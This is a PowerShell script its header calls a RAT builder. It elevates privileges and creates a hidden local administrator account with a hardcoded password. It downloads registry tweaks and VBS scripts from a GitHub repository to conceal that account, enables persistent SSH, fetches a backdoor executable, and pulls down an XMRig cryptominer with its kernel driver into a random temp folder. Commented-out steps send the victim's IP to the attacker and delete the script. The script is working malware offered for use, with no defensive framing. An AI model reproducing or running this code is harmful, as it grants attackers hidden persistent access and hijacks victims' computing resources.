# builds resources for RAT

# random string for directories
function random_text {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
}

#create admin

if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    $arguments = "& '" + $myinvocation.mycommand.definition + "'"
    Start-Process powershell -Verb runAs -ArgumentList $arguments
    Exit
} else {
    # Create a new local admin account
    $username = "Venom"
    $password = ConvertTo-SecureString "V3n0m" -AsPlainText -Force
    New-LocalUser $username -Password $password -FullName "Venom" -Description "Local admin account created via PowerShell"
    Add-LocalGroupMember -Group "Administrators" -Member $username
}


## variables
$wd = random_text
$path = "$env:temp/$wd"
$path_1 = $path/$wd
$initial_dir = Get-Location


# create admin user
#$NewLocalAdmin = "Venom"
#$Password = (ConvertTo-SecureString "V3n0m" -AsPlainText -Force)
#Create-NewLocalAdmin -NewLocalAdmin $NewLocalAdmin -Password $Password

# send ip to attacker
#./smtp.ps1

#goto temp, make working dir
mkdir $path
cd $path
# mv $initial_dir/smtp.txt ./smtp.ps1
#./smtp.ps1

# registry to hide  local admin
Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/wrev.reg -OutFile "wrev.reg"

#visual basic scrit to download the registry
Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/calty.vbs -OutFile "calty.vbs"

# enabling  persistent ssh
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'
Get-NetFirewallRule -Name *ssh*

#install the registry
./wrev.reg; ./calty

#install backdoor
Invoke-WebRequest -Uri https://github.com/P0k3m0n-unleashed/ProjSucc/blob/master/Venom/exe/attempt1.exe -OutFile "attempt1.exe"

#visual bsic script to install backdoor
Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/calty2.vbs -OutFile "calty2.vbs"

#powershell powershell.exe -windowstyle hidden -ep bypass ./attempt1.exe

mkdir $path_1
cd $path_1



$baseUri = 'https://github.com/P0k3m0n-unleashed/ProjSucc/tree/master/Venom/xmrig-6.22.2'
$files = @(
    @{
        Uri = "$baseUri/SHA256SUMS"
        OutFile = 'SHA256SUMS.txt'
    },
    @{
        Uri = "$baseUri/WinRing0x64.sys"
        OutFile = 'WinRing0x64.sys'
    },
    @{
        Uri = "$baseUri/benchmark_10M.cmd"
        OutFile = 'benchmark_10M.cmd'
    },
    @{
        Uri = "$baseUri/benchmark_1M.cmd"
        OutFile = 'benchmark_1M.cmd'
    },
    @{
        Uri = "$baseUri/config.json"
        OutFile = 'config.json'
    },
    @{
        Uri = "$baseUri/start.cmd"
        OutFile = 'start.cmd'
    },
    @{
        Uri = "$baseUri/xmrig.exe"
        OutFile = 'xmrig.exe'
    } 
)

$jobs = @()

foreach ($file in $files) {
    $jobs += Start-ThreadJob -Name $file.OutFile -ScriptBlock {
        $params = $using:file
        Invoke-WebRequest @params
    }
}

Write-Host "Downloads started..."
Wait-Job -Job $jobs

foreach ($job in $jobs) {
    Receive-Job -Job $job
}



pause
#.\attempt1.exe; ./calty2
    # Install the attempt1.exe file
#powershell Start-Process -FilePath $path .\attempt1.exe -ArgumentList "/silent" -Wait

# hide venom user

# self delete
cd $initial_dir
#del installer.ps1

